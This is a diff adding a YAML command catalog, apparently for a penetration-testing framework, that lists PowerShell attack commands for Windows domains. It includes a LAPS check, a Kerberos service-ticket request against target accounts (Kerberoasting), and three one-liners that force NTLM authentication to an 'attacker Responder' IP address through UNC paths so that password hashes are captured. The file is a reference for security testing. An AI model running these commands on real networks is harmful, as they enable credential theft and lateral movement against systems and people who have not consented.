@@ -1,0 +1,45 @@
+---
+name: powershell
+description: A task automation and configuration management framework, command-line shell, and scripting language
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Query LAPS Usage":
+    - type: ["powershell","standalone"]
+    - text: "Get-ChildItem 'C:\\Program Files\\LAPS\\CSE\\AdmPwd.dll'"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Manually Request SPN Kerberos Tickets for Target Account(s)":
+    - type: ["powershell","standalone"]
+    - text:
+      - "Add-Type -AssemblyName System.IdentityModel"
+      - "New-Object System.IdentityModel.Tokens.KerberosRequestor.SecurityToken -ArgumentList \"{STR}\""
+    - input: ["kerberos realm"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via Invoke-Item)":
+    - type: ["powershell","standalone"]
+    - text: "Invoke-Item \\\\{IPV4}\\C$\\blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via Get-Content)":
+    - type: ["powershell","standalone"]
+    - text: "Get-Content \\\\{IPV4}\\C$\\blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Elicit an NTLMv1/v2 Authetication Leak (via Start-Process)":
+    - type: ["powershell","standalone"]
+    - text: "Start-Process \\\\{IPV4}\\C$\\blah"
+    - input: ["attacker Responder IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+...
